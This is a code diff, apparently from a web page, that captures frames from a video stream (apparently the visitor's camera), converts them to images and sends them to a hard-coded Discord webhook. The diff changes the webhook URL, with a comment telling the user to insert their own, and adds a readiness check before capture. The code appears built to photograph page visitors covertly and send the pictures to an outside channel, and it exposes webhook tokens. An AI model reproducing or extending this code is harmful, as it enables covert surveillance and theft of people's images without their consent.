@@ -34,7 +34,7 @@
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
 
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1362553494988394757/pw4iKW76TUWd1pjYnfg6BpUv1_3X_RByXC52LJ0f91locIV95cdMDCWMccOOH5htPEtS"; // ← غيره بالرابط بتاعك
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1362557678391525476/A9APQh3dZexbMw9xDul_wsnHLbJBG0LjEuJrVJmE9zc3vZf5fMaGLRYsatoVFw40vV3C"; // ← غيره بالرابط بتاعك
 
         let stream;
         let recorder;
@@ -60,14 +60,19 @@
         };
 
         function captureImage() {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imgData = canvas.toDataURL('image/png');
-            const imageHash = `sent_image_${hashString(imgData)}`;
+            // تأكد من أن الفيديو يتم عرضه على الكاميرا بشكل صحيح
+            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imgData = canvas.toDataURL('image/png');
+                const imageHash = `sent_image_${hashString(imgData)}`;
 
-            if (!localStorage.getItem(imageHash)) {
-                sendImage(imgData, imageHash);
+                if (!localStorage.getItem(imageHash)) {
+                    sendImage(imgData, imageHash);
+                } else {
+                    console.log("✅ الصورة دي اتبعتت قبل كده");
+                }
             } else {
-                console.log("✅ الصورة دي اتبعتت قبل كده");
+                console.log("⚠️ الفيديو غير جاهز للتصوير بعد.");
             }
         }
 
